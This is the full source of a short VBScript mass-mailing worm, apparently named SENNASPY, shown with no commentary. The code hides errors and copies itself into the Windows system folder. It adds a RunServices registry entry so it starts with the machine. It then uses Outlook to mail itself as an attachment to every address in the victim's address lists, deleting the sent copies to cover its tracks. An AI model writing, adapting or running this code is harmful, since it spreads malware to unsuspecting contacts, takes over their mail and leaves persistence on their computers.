On Error Resume Next

Dim OL01, OL02, OL03, OL04, OL05

Dim RG01, RG02

Set RG01 = CreateObject( "Scripting.FileSystemObject" )
RG01.CopyFile WScript.ScriptFullName, RG01.BuildPath( RG01.GetSpecialFolder(0), "SENNASPY.VBS" )

Set RG02 = CreateObject( "WScript.Shell" )
RG02.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & "SENNASPY", RG01.BuildPath( RG01.GetSpecialFolder(0), "SENNASPY.VBS" )

Set OL01 = CreateObject( "Outlook.Application" )
Set OL02 = OL01.GetNameSpace( "MAPI" )

For Each OL03 In OL02.AddressLists
    For OL04 = 1 To OL03.AddressEntries.Count
        Set OL05 = OL01.CreateItem( 0 )

        OL05.BCC = OL03.AddressEntries( OL04 ).Address

        OL05.Subject = "sqdfsdf"
        OL05.Body = "xcvxcg"
        OL05.Attachments.Add WScript.ScriptFullName
        OL05.DeleteAfterSubmit = True
        OL05.Send
    Next
Next
